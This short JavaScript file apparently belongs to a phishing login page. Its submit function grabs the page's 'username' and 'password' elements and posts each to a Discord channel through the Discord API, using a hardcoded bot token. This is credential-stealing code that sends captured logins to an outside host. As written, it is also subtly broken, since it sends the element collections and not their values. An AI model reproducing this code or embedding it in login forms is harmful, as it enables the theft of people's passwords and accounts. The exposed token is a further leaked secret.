async function submit() {
    const channel_id = "1090966233911935018";
    const token = "75c75aa2416142609b27b78e6fcfb1b34978e12bf4a81561e1a8f65eb9ac48fb";
    const content1 = document.getElementsByClassName("username")
    const content2 = document.getElementsByClassName("password")

  
      

    fetch(`https://discord.com/api/channels/${channel_id}/messages`, {
      method: "POST",
      headers: {
        Authorization: `Bot ${token}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ content: content1 }),
    })
      .then((response) => {
        console.log("Message sent successfully");
        return response.json();
      })
      .then((data) => {
        console.log(data);
      })
      .catch((error) => {
        console.error("Error sending message:", error);
      });
      await new Promise(resolve => setTimeout(resolve, 2000));
      fetch(`https://discord.com/api/channels/${channel_id}/messages`, {
        method: "POST",
        headers: {
          Authorization: `Bot ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ content: content2 }),
      })
        .then((response) => {
          console.log("Message sent successfully");
          return response.json();
        })
        .then((data) => {
          console.log(data);
        })
        .catch((error) => {
          console.error("Error sending message:", error);
        });
  }
  